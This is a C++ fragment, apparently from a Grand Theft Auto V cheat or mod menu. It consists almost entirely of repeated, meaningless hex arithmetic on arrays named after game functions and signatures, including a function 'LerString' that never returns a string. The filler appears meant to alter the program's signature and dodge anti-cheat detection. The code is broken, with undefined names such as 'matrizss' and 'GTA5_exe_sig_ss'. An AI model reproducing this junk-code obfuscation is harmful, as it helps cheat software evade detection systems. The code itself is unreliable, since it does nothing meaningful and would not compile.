				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			std::string LerString(std::string app, std::string key)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
